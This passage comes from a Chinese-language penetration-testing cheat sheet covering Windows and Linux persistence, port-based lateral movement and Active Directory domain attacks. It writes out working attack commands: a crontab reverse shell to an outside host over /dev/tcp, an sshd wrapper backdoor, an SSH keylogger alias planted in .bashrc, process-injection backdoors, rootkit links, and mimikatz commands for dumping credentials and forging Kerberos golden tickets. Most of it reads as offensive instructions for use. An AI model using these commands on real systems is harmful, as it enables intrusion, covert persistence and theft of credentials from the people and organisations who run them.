<h5 id="17、DLL劫持"><a href="#17、DLL劫持" class="headerlink" title="17、DLL劫持"></a>17、<a href="https://3gstudent.github.io/3gstudent.github.io/DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%8C%96%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7Rattler%E6%B5%8B%E8%AF%95/" target="_blank" rel="noopener">DLL劫持</a></h5><p>通过Rattler自动枚举进程，检测是否存在可用dll劫持利用的进程<br>使用：Procmon半自动测试更精准，常规生成的dll会导致程序执行报错或中断，使用AheadLib配合生成dll劫持利用源码不会影响程序执行<br>工具：<a href="https://github.com/sensepost/rattler" target="_blank" rel="noopener">https://github.com/sensepost/rattler</a><br>工具：<a href="https://github.com/Yonsm/AheadLib" target="_blank" rel="noopener">https://github.com/Yonsm/AheadLib</a></p>
<h5 id="18、DoubleAgent"><a href="#18、DoubleAgent" class="headerlink" title="18、DoubleAgent "></a>18、<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Verifier(DoubleAgent%E5%88%A9%E7%94%A8%E4%BB%8B%E7%BB%8D)/" target="_blank" rel="noopener">DoubleAgent </a></h5><p>编写自定义Verifier provider DLL<br>通过Application Verifier进行安装<br>注入到目标进程执行payload<br>每当目标进程启动，均会执行payload，相当于一个自启动的方式<br>POC : <a href="https://github.com/Cybellum/DoubleAgent" target="_blank" rel="noopener">https://github.com/Cybellum/DoubleAgent</a></p>
<h5 id="19、waitfor-exe"><a href="#19、waitfor-exe" class="headerlink" title="19、waitfor.exe "></a>19、<a href="https://3gstudent.github.io/3gstudent.github.io/Use-Waitfor.exe-to-maintain-persistence/" target="_blank" rel="noopener">waitfor.exe </a></h5><p>不支持自启动，但可远程主动激活，后台进程显示为waitfor.exe<br>POC : <a href="https://github.com/3gstudent/Waitfor-Persistence" target="_blank" rel="noopener">https://github.com/3gstudent/Waitfor-Persistence</a></p>
<h5 id="20、AppDomainManager"><a href="#20、AppDomainManager" class="headerlink" title="20、AppDomainManager"></a>20、<a href="https://3gstudent.github.io/3gstudent.github.io/Use-AppDomainManager-to-maintain-persistence/" target="_blank" rel="noopener">AppDomainManager</a></h5><p>针对.Net程序，通过修改AppDomainManager能够劫持.Net程序的启动过程。如果劫持了系统常见.Net程序如powershell.exe的启动过程，向其添加payload，就能实现一种被动的后门触发机制</p>
<h5 id="21、Office"><a href="#21、Office" class="headerlink" title="21、Office"></a>21、Office</h5><p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8BDF%E5%90%91DLL%E6%96%87%E4%BB%B6%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8/" target="_blank" rel="noopener">劫持Office软件的特定功能</a>:通过dll劫持,在Office软件执行特定功能时触发后门<br><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8VSTO%E5%AE%9E%E7%8E%B0%E7%9A%84office%E5%90%8E%E9%97%A8/" target="_blank" rel="noopener">利用VSTO实现的office后门</a><br><a href="https://github.com/3gstudent/Office-Persistence" target="_blank" rel="noopener">Office加载项</a></p>
<ul>
<li>Word WLL </li>
<li>Excel XLL </li>
<li>Excel VBA add-ins </li>
<li>PowerPoint VBA add-ins</li>
</ul>
<blockquote>
<p>参考1 ：<a href="https://3gstudent.github.io/3gstudent.github.io/Use-Office-to-maintain-persistence/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/Use-Office-to-maintain-persistence/</a><br>参考2 ：<a href="https://3gstudent.github.io/3gstudent.github.io/Office-Persistence-on-x64-operating-system/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/Office-Persistence-on-x64-operating-system/</a></p>
</blockquote>
<h5 id="22、CLR"><a href="#22、CLR" class="headerlink" title="22、CLR"></a>22、<a href="https://3gstudent.github.io/3gstudent.github.io/Use-CLR-to-maintain-persistence/" target="_blank" rel="noopener">CLR</a></h5><p>无需管理员权限的后门，并能够劫持所有.Net程序<br>POC:<a href="https://github.com/3gstudent/CLR-Injection" target="_blank" rel="noopener">https://github.com/3gstudent/CLR-Injection</a></p>
<h5 id="23、msdtc"><a href="#23、msdtc" class="headerlink" title="23、msdtc"></a>23、<a href="https://3gstudent.github.io/3gstudent.github.io/Use-msdtc-to-maintain-persistence/" target="_blank" rel="noopener">msdtc</a></h5><p>利用MSDTC服务加载dll，实现自启动，并绕过Autoruns对启动项的检测<br>利用：向 %windir%\system32\目录添加dll并重命名为oci.dll</p>
<h5 id="24、Hijack-CAccPropServicesClass-and-MMDeviceEnumerato"><a href="#24、Hijack-CAccPropServicesClass-and-MMDeviceEnumerato" class="headerlink" title="24、Hijack CAccPropServicesClass and MMDeviceEnumerato"></a>24、<a href="https://3gstudent.github.io/3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-CAccPropServicesClass-and-MMDeviceEnumerator/" target="_blank" rel="noopener">Hijack CAccPropServicesClass and MMDeviceEnumerato</a></h5><p>利用COM组件，不需要重启系统，不需要管理员权限<br>通过修改注册表实现<br>POC：<a href="https://github.com/3gstudent/COM-Object-hijacking" target="_blank" rel="noopener">https://github.com/3gstudent/COM-Object-hijacking</a> </p>
<h5 id="25、Hijack-explorer-exe"><a href="#25、Hijack-explorer-exe" class="headerlink" title="25、Hijack explorer.exe"></a>25、<a href="https://3gstudent.github.io/3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-explorer.exe/" target="_blank" rel="noopener">Hijack explorer.exe</a></h5><p>COM组件劫持，不需要重启系统，不需要管理员权限<br>通过修改注册表实现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKCU\Software\Classes\CLSID&#123;42aedc87-2188-41fd-b9a3-0c966feabec1&#125;</span><br><span class="line">HKCU\Software\Classes\CLSID&#123;fbeb8a05-beee-4442-804e-409d6c4515e9&#125;</span><br><span class="line">HKCU\Software\Classes\CLSID&#123;b5f8350b-0548-48b1-a6ee-88bd00b4a5e7&#125;</span><br><span class="line">HKCU\Software\Classes\Wow6432Node\CLSID&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;</span><br></pre></td></tr></table></figure>
<h5 id="26、Windows-FAX-DLL-Injection"><a href="#26、Windows-FAX-DLL-Injection" class="headerlink" title="26、Windows FAX DLL Injection"></a>26、Windows FAX DLL Injection</h5><p>通过DLL劫持，劫持Explorer.exe对<code>fxsst.dll</code>的加载<br>Explorer.exe在启动时会加载<code>c:\Windows\System32\fxsst.dll</code>(服务默认开启，用于传真服务)将payload.dll保存在<code>c:\Windows\fxsst.dll</code>，能够实现dll劫持，劫持Explorer.exe对<code>fxsst.dll</code>的加载</p>
<h5 id="27、特殊注册表键值"><a href="#27、特殊注册表键值" class="headerlink" title="27、特殊注册表键值"></a>27、特殊注册表键值</h5><p>在注册表启动项创建特殊名称的注册表键值，用户正常情况下无法读取(使用Win32 API)，但系统能够执行(使用Native API)。<br><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E5%88%9B%E5%BB%BA/" target="_blank" rel="noopener">《渗透技巧——“隐藏”注册表的创建》</a><br><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E6%9B%B4%E5%A4%9A%E6%B5%8B%E8%AF%95/" target="_blank" rel="noopener">《渗透技巧——“隐藏”注册表的更多测试》</a></p>
<h5 id="28、快捷方式后门"><a href="#28、快捷方式后门" class="headerlink" title="28、快捷方式后门"></a>28、快捷方式后门</h5><p>替换我的电脑快捷方式启动参数<br>POC : <a href="https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1" target="_blank" rel="noopener">https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1</a></p>
<h5 id="29、Logon-Scripts"><a href="#29、Logon-Scripts" class="headerlink" title="29、Logon Scripts"></a>29、<a href="https://3gstudent.github.io/3gstudent.github.io/Use-Logon-Scripts-to-maintain-persistence/" target="_blank" rel="noopener">Logon Scripts</a></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">New-ItemProperty &quot;HKCU:\Environment\&quot; UserInitMprLogonScript -value &quot;c:\test\11.bat&quot; -propertyType string | Out-Null</span><br></pre></td></tr></table></figure>
<h5 id="30、Password-Filter-DLL"><a href="#30、Password-Filter-DLL" class="headerlink" title="30、Password Filter DLL"></a>30、<a href="https://3gstudent.github.io/3gstudent.github.io/Password-Filter-DLL%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/" target="_blank" rel="noopener">Password Filter DLL</a></h5><h5 id="31、利用BHO实现IE浏览器劫持"><a href="#31、利用BHO实现IE浏览器劫持" class="headerlink" title="31、利用BHO实现IE浏览器劫持"></a>31、<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8BHO%E5%AE%9E%E7%8E%B0IE%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81/" target="_blank" rel="noopener">利用BHO实现IE浏览器劫持</a></h5><h4 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h4><h5 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h5><p>每60分钟反弹一次shell给dns.wuyun.org的53端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">(crontab -l;printf &quot;*/60 * * * * exec 9&lt;&gt; /dev/tcp/dns.wuyun.org/53;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n&quot;)|crontab -</span><br></pre></td></tr></table></figure>
<h5 id="硬链接sshd"><a href="#硬链接sshd" class="headerlink" title="硬链接sshd"></a>硬链接sshd</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=2333;</span><br></pre></td></tr></table></figure>
<p>链接：ssh <a href="mailto:root@192.168.206.142" target="_blank" rel="noopener">root@192.168.206.142</a> -p 2333</p>
<h5 id="SSH-Server-wrapper"><a href="#SSH-Server-wrapper" class="headerlink" title="SSH Server wrapper"></a>SSH Server wrapper</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">cd /usr/sbin</span><br><span class="line">mv sshd ../bin</span><br><span class="line">echo &apos;#!/usr/bin/perl&apos; &gt;sshd</span><br><span class="line">echo &apos;exec &quot;/bin/sh&quot; if (getpeername(STDIN) =~ /^..4A/);&apos; &gt;&gt;sshd</span><br><span class="line">echo &apos;exec &#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&apos; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line">//不用重启也行</span><br><span class="line">/etc/init.d/sshd restart</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat STDIO TCP4:192.168.206.142:22,sourceport=13377</span><br></pre></td></tr></table></figure>
<h5 id="SSH-keylogger"><a href="#SSH-keylogger" class="headerlink" title="SSH keylogger"></a>SSH keylogger</h5><p>vim当前用户下的.bashrc文件,末尾添加</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!bash</span><br><span class="line">alias ssh=&apos;strace -o /tmp/sshpwd-`date &apos;+%d%h%m%s&apos;`.log -e read,write,connect -s2048 ssh&apos;</span><br></pre></td></tr></table></figure>
<p>source .bashrc</p>
<h5 id="Cymothoa-进程注入backdoor"><a href="#Cymothoa-进程注入backdoor" class="headerlink" title="Cymothoa_进程注入backdoor"></a>Cymothoa_进程注入backdoor</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">./cymothoa -p 2270 -s 1 -y 7777</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -vv ip 7777</span><br></pre></td></tr></table></figure>
<h5 id="rootkit"><a href="#rootkit" class="headerlink" title="rootkit"></a>rootkit</h5><p><a href="http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz" target="_blank" rel="noopener">openssh_rootkit</a><br><a href="http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz" target="_blank" rel="noopener">Kbeast_rootkit </a><br>Mafix + Suterusu rootkit</p>
<h5 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h5><p><a href="https://github.com/Screetsec/Vegile" target="_blank" rel="noopener">Vegile </a><br><a href="https://github.com/icco/backdoor" target="_blank" rel="noopener">backdoor </a></p>
<h3 id="WEB后门"><a href="#WEB后门" class="headerlink" title="WEB后门"></a>WEB后门</h3><p>PHP Meterpreter后门<br>Aspx Meterpreter后门<br>weevely<br>webacoo<br>….</p>
<h2 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h2><h3 id="端口渗透"><a href="#端口渗透" class="headerlink" title="端口渗透"></a>端口渗透</h3><h4 id="端口扫描-1"><a href="#端口扫描-1" class="headerlink" title="端口扫描"></a>端口扫描</h4><ul>
<li>1.端口的指纹信息（版本信息） </li>
<li>2.端口所对应运行的服务  </li>
<li>3.常见的默认端口号  </li>
<li>4.尝试弱口令 </li>
</ul>
<h4 id="端口爆破"><a href="#端口爆破" class="headerlink" title="端口爆破"></a>端口爆破</h4><p><a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank" rel="noopener">hydra </a></p>
<h4 id="端口弱口令"><a href="#端口弱口令" class="headerlink" title="端口弱口令"></a>端口弱口令</h4><ul>
<li>NTScan  </li>
<li>Hscan  </li>
<li>自写脚本 </li>
</ul>
<h4 id="端口溢出"><a href="#端口溢出" class="headerlink" title="端口溢出"></a>端口溢出</h4><p><strong>smb</strong></p>
<ul>
<li>ms08067 </li>
<li>ms17010 </li>
<li>ms11058 </li>
<li>… </li>
</ul>
<p><strong>apache</strong><br><strong>ftp</strong><br><strong>…</strong></p>
<h4 id="常见的默认端口"><a href="#常见的默认端口" class="headerlink" title="常见的默认端口"></a>常见的默认端口</h4><h5 id="1、web类-web漏洞-敏感目录"><a href="#1、web类-web漏洞-敏感目录" class="headerlink" title="1、web类(web漏洞/敏感目录)"></a>1、web类(web漏洞/敏感目录)</h5><p>第三方通用组件漏洞: struts thinkphp jboss ganglia zabbix …</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">80 web </span><br><span class="line">80-89 web </span><br><span class="line">8000-9090 web</span><br></pre></td></tr></table></figure>
<h5 id="2、数据库类-扫描弱口令"><a href="#2、数据库类-扫描弱口令" class="headerlink" title="2、数据库类(扫描弱口令)"></a>2、数据库类(扫描弱口令)</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1433 MSSQL </span><br><span class="line">1521 Oracle </span><br><span class="line">3306 MySQL </span><br><span class="line">5432 PostgreSQL </span><br><span class="line">50000 DB2</span><br></pre></td></tr></table></figure>
<h5 id="3、特殊服务类-未授权-命令执行类-漏洞"><a href="#3、特殊服务类-未授权-命令执行类-漏洞" class="headerlink" title="3、特殊服务类(未授权/命令执行类/漏洞)"></a>3、特殊服务类(未授权/命令执行类/漏洞)</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">443 SSL心脏滴血 </span><br><span class="line">445 ms08067/ms11058/ms17010等 </span><br><span class="line">873 Rsync未授权 </span><br><span class="line">5984 CouchDB http://xxx:5984/_utils/ </span><br><span class="line">6379 redis未授权 </span><br><span class="line">7001,7002 WebLogic默认弱口令，反序列 </span><br><span class="line">9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 </span><br><span class="line">11211 memcache未授权访问 </span><br><span class="line">27017,27018 Mongodb未授权访问 </span><br><span class="line">50000 SAP命令执行 </span><br><span class="line">50070,50030 hadoop默认端口未授权访问</span><br></pre></td></tr></table></figure>
<h5 id="4、常用端口类-扫描弱口令-端口爆破"><a href="#4、常用端口类-扫描弱口令-端口爆破" class="headerlink" title="4、常用端口类(扫描弱口令/端口爆破)"></a>4、常用端口类(扫描弱口令/端口爆破)</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">21 ftp </span><br><span class="line">22 SSH </span><br><span class="line">23 Telnet </span><br><span class="line">445 SMB弱口令扫描 </span><br><span class="line">2601,2604 zebra路由，默认密码zebra </span><br><span class="line">3389 远程桌面</span><br></pre></td></tr></table></figure>
<h5 id="5、端口合计所对应的服务"><a href="#5、端口合计所对应的服务" class="headerlink" title="5、端口合计所对应的服务"></a>5、端口合计所对应的服务</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">21 ftp </span><br><span class="line">22 SSH </span><br><span class="line">23 Telnet </span><br><span class="line">25 SMTP </span><br><span class="line">53 DNS </span><br><span class="line">69 TFTP </span><br><span class="line">80 web </span><br><span class="line">80-89 web </span><br><span class="line">110 POP3 </span><br><span class="line">135 RPC </span><br><span class="line">139 NETBIOS </span><br><span class="line">143 IMAP </span><br><span class="line">161 SNMP </span><br><span class="line">389 LDAP </span><br><span class="line">443 SSL心脏滴血以及一些web漏洞测试 </span><br><span class="line">445 SMB </span><br><span class="line">512,513,514 Rexec </span><br><span class="line">873 Rsync未授权 </span><br><span class="line">1025,111 NFS </span><br><span class="line">1080 socks </span><br><span class="line">1158 ORACLE EMCTL2601,2604 zebra路由，默认密码zebra案 </span><br><span class="line">1433 MSSQL (暴力破解) </span><br><span class="line">1521 Oracle:(iSqlPlus Port:5560,7778) </span><br><span class="line">2082/2083 cpanel主机管理系统登陆 （国外用较多） </span><br><span class="line">2222 DA虚拟主机管理系统登陆 （国外用较多） </span><br><span class="line">2601,2604 zebra路由，默认密码zebra </span><br><span class="line">3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了 </span><br><span class="line">3306 MySQL （暴力破解） </span><br><span class="line">3312/3311 kangle主机管理系统登陆 </span><br><span class="line">3389 远程桌面 </span><br><span class="line">3690 svn </span><br><span class="line">4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网 </span><br><span class="line">4848 GlassFish web中间件 弱口令:admin/adminadmin </span><br><span class="line">5432 PostgreSQL </span><br><span class="line">5900 vnc </span><br><span class="line">5984 CouchDB http://xxx:5984/_utils/ </span><br><span class="line">6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网 </span><br><span class="line">6379 redis未授权 </span><br><span class="line">7001,7002 WebLogic默认弱口令，反序列 </span><br><span class="line">7778 Kloxo主机控制面板登录 </span><br><span class="line">8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上 </span><br><span class="line">8080 tomcat/WDCd/ 主机管理系统，默认弱口令 </span><br><span class="line">8080,8089,9090 JBOSS </span><br><span class="line">8081 Symantec AV/Filter for MSE </span><br><span class="line">8083 Vestacp主机管理系统 （国外用较多） </span><br><span class="line">8649 ganglia </span><br><span class="line">8888 amh/LuManager 主机管理系统默认端口 </span><br><span class="line">9000 fcgi fcig php执行 </span><br><span class="line">9043 websphere[web中间件] 弱口令: admin/admin websphere/ websphere ststem/manager </span><br><span class="line">9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 </span><br><span class="line">10000 Virtualmin/Webmin 服务器虚拟主机管理系统 </span><br><span class="line">11211 memcache未授权访问 </span><br><span class="line">27017,27018 Mongodb未授权访问 </span><br><span class="line">28017 mongodb统计页面 </span><br><span class="line">50000 SAP命令执行 </span><br><span class="line">50060 hadoop </span><br><span class="line">50070,50030 hadoop默认端口未授权访问</span><br></pre></td></tr></table></figure>
<h3 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h3><h4 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>powerview.ps1 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-NetDomain - gets the name of the current user&apos;s domain</span><br><span class="line">Get-NetForest - gets the forest associated with the current user&apos;s domain</span><br><span class="line">Get-NetForestDomains - gets all domains for the current forest</span><br><span class="line">Get-NetDomainControllers - gets the domain controllers for the current computer&apos;s domain</span><br><span class="line">Get-NetCurrentUser - gets the current [domain\]username</span><br><span class="line">Get-NetUser - returns all user objects, or the user specified (wildcard specifiable)</span><br><span class="line">Get-NetUserSPNs - gets all user ServicePrincipalNames</span><br><span class="line">Get-NetOUs - gets data for domain organization units</span><br><span class="line">Get-NetGUIDOUs - finds domain OUs linked to a specific GUID</span><br><span class="line">Invoke-NetUserAdd - adds a local or domain user</span><br><span class="line">Get-NetGroups - gets a list of all current groups in the domain</span><br><span class="line">Get-NetGroup - gets data for each user in a specified domain group</span><br><span class="line">Get-NetLocalGroups - gets a list of localgroups on a remote host or hosts</span><br><span class="line">Get-NetLocalGroup - gets the members of a localgroup on a remote host or hosts</span><br><span class="line">Get-NetLocalServices - gets a list of running services/paths on a remote host or hosts</span><br><span class="line">Invoke-NetGroupUserAdd - adds a user to a specified local or domain group</span><br><span class="line">Get-NetComputers - gets a list of all current servers in the domain</span><br><span class="line">Get-NetFileServers - get a list of file servers used by current domain users</span><br><span class="line">Get-NetShare - gets share information for a specified server</span><br><span class="line">Get-NetLoggedon - gets users actively logged onto a specified server</span><br><span class="line">Get-NetSessions - gets active sessions on a specified server</span><br><span class="line">Get-NetFileSessions - returned combined Get-NetSessions and Get-NetFiles</span><br><span class="line">Get-NetConnections - gets active connections to a specific server resource (share)</span><br><span class="line">Get-NetFiles - gets open files on a server</span><br><span class="line">Get-NetProcesses - gets the remote processes and owners on a remote server</span><br></pre></td></tr></table></figure>
<p>BloodHound<br>​            </p>
<h4 id="获取域控的方法"><a href="#获取域控的方法" class="headerlink" title="获取域控的方法"></a>获取域控的方法</h4><h5 id="SYSVOL"><a href="#SYSVOL" class="headerlink" title="SYSVOL"></a>SYSVOL</h5><p>SYSVOL是指存储域公共文件服务器副本的共享文件夹，它们在域中所有的域控制器之间复制。 Sysvol文件夹是安装AD时创建的，它用来存放GPO、Script等信息。同时，存放在Sysvol文件夹中的信息，会复制到域中所有DC上。<br>相关阅读: </p>
<ul>
<li><a href="http://www.freebuf.com/vuls/92016.html" target="_blank" rel="noopener">寻找SYSVOL里的密码和攻击GPP（组策略偏好） </a></li>
<li><a href="http://blog.51cto.com/ycrsjxy/203095" target="_blank" rel="noopener">Windows Server 2008 R2之四管理Sysvol文件夹 </a></li>
<li><a href="https://adsecurity.org/?p=2288" target="_blank" rel="noopener">SYSVOL中查找密码并利用组策略首选项 </a></li>
<li><a href="https://xz.aliyun.com/t/1653" target="_blank" rel="noopener">利用SYSVOL还原组策略中保存的密码</a> </li>
</ul>
<h5 id="MS14-068-Kerberos"><a href="#MS14-068-Kerberos" class="headerlink" title="MS14-068 Kerberos"></a>MS14-068 Kerberos</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python ms14-068.py -u 域用户@域名 -p 密码 -s 用户SID -d 域主机</span><br></pre></td></tr></table></figure>
<p>利用mimikatz将工具得到的<a href="mailto:TGT_domainuser@SERVER.COM.ccache" target="_blank" rel="noopener">TGT_domainuser@SERVER.COM.ccache</a>写入内存，创建缓存证书：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptc c:TGT_darthsidious@pentest.com.ccache&quot; exit</span><br><span class="line">net use k: \pentest.comc$</span><br></pre></td></tr></table></figure>
<p>相关阅读 :</p>
<ul>
<li><a href="http://adsecurity.org/?p=676" target="_blank" rel="noopener">Kerberos的工具包PyKEK</a> </li>
<li><a href="http://www.freebuf.com/vuls/56081.html" target="_blank" rel="noopener">深入解读MS14-068漏洞</a> </li>
<li><a href="https://adsecurity.org/?p=541" target="_blank" rel="noopener">Kerberos的安全漏洞</a> </li>
</ul>
<h5 id="SPN扫描"><a href="#SPN扫描" class="headerlink" title="SPN扫描"></a>SPN扫描</h5><p>Kerberoast可以作为一个有效的方法从Active Directory中以普通用户的身份提取服务帐户凭据，无需向目标系统发送任何数据包。<br>SPN是服务在使用Kerberos身份验证的网络上的唯一标识符。它由服务类，主机名和端口组成。在使用Kerberos身份验证的网络中，必须在内置计算机帐户（如NetworkService或LocalSystem）或用户帐户下为服务器注册SPN。对于内部帐户，SPN将自动进行注册。但是，如果在域用户帐户下运行服务，则必须为要使用的帐户的手动注册SPN。<br>SPN扫描的主要好处是，SPN扫描不需要连接到网络上的每个IP来检查服务端口，SPN通过LDAP查询向域控执行服务发现，SPN查询是Kerberos的票据行为一部分，因此比较难检测SPN扫描。<br>相关阅读 :</p>
<ul>
<li><a href="https://blog.netspi.com/locate-and-attack-domain-sql-servers-without-scanning/" target="_blank" rel="noopener">非扫描式的SQL Server发现</a> </li>
<li><a href="https://adsecurity.org/?p=1508" target="_blank" rel="noopener">SPN扫描</a> </li>
<li><a href="https://github.com/PyroTek3/PowerShell-AD-Recon" target="_blank" rel="noopener">扫描SQLServer的脚本</a> </li>
</ul>
<h5 id="Kerberos的黄金门票"><a href="#Kerberos的黄金门票" class="headerlink" title="Kerberos的黄金门票"></a>Kerberos的黄金门票</h5><p>在域上抓取的哈希</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /domain:pentest.com /user:krbtgt</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::purge</span><br><span class="line">kerberos::golden /admin:administrator /domain:域 /sid:SID /krbtgt:hash值 /ticket:adinistrator.kiribi</span><br><span class="line">kerberos::ptt administrator.kiribi</span><br><span class="line">kerberos::tgt</span><br><span class="line">net use k: \pnet use k: \pentest.comc$</span><br></pre></td></tr></table></figure>
<p>相关阅读 :</p>
<ul>
<li><a href="https://adsecurity.org/?p=1640" target="_blank" rel="noopener">https://adsecurity.org/?p=1640</a> </li>
<li><a href="http://bobao.360.cn/learning/detail/3564.html" target="_blank" rel="noopener">域服务账号破解实践</a> </li>
<li><a href="https://blog.csdn.net/wulantian/article/details/42418231" target="_blank" rel="noopener">Kerberos的认证原理</a> </li>
<li><a href="https://klionsec.github.io/2016/08/10/ntlm-kerberos/" target="_blank" rel="noopener">深刻理解windows安全认证机制ntlm＆Kerberos</a> </li>
</ul>
<h5 id="Kerberos的银票务"><a href="#Kerberos的银票务" class="headerlink" title="Kerberos的银票务"></a>Kerberos的银票务</h5><p>黄金票据和白银票据的一些区别：<br>Golden Ticket：伪造<code>TGT</code>，可以获取<code>任何Kerberos</code>服务权限<br>银票：伪造TGS，<code>只能访问指定的服务</code><br>加密方式不同：<br>Golden Ticket由<code>krbtgt</code>的hash加密<br>Silver Ticket由<code>服务账号</code>（通常为计算机账户）Hash加密<br>认证流程不同：<br>金票在使用的过程需要同域控通信<br>银票在使用的过程不需要同域控通信<br>相关阅读 :</p>
<ul>
<li><a href="https://adsecurity.org/?p=2011" target="_blank" rel="noopener">攻击者如何使用Kerberos的银票来利用系统</a> </li>
<li><a href="https://www.feiworks.com/wy/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass%20The%20Ticket.pdf" target="_blank" rel="noopener">域渗透——Pass The Ticket</a></li>
</ul>
<h5 id="域服务账号破解"><a href="#域服务账号破解" class="headerlink" title="域服务账号破解"></a>域服务账号破解</h5><p>与上面SPN扫描类似的原理<br><a href="https://github.com/nidem/kerberoast" target="_blank" rel="noopener">https://github.com/nidem/kerberoast</a><br>获取所有用作SPN的帐户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setspn -T PENTEST.com -Q */*</span><br></pre></td></tr></table></figure>
<p>从Mimikatz的RAM中提取获得的门票</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::list /export</span><br></pre></td></tr></table></figure>
<p>用rgsrepcrack破解</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi</span><br></pre></td></tr></table></figure>
<h5 id="凭证盗窃"><a href="#凭证盗窃" class="headerlink" title="凭证盗窃"></a>凭证盗窃</h5><p>从搜集的密码里面找管理员的密码 </p>
<h5 id="地址解析协议"><a href="#地址解析协议" class="headerlink" title="地址解析协议"></a>地址解析协议</h5><p>实在搞不定再搞ARP<br>​    </p>
<h4 id="获取AD哈希"><a href="#获取AD哈希" class="headerlink" title="获取AD哈希"></a>获取AD哈希</h4><ul>
<li>使用VSS卷影副本 </li>
<li>Ntdsutil中获取NTDS.DIT​​文件 </li>
<li>PowerShell中提取NTDS.DIT –&gt;<a href="https://github.com/clymb3r/PowerShell/tree/master/Invoke-NinjaCopy" target="_blank" rel="noopener">Invoke-NinaCopy </a></li>
<li>使用Mimikatz提取 </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz lsadump::lsa /inject exit</span><br></pre></td></tr></table></figure>
<ul>
<li>使用PowerShell Mimikatz</li>
<li>使用Mimikatz的DCSync 远程转储Active Directory凭证<br>提取 KRBTGT用户帐户的密码数据：</li>
</ul>
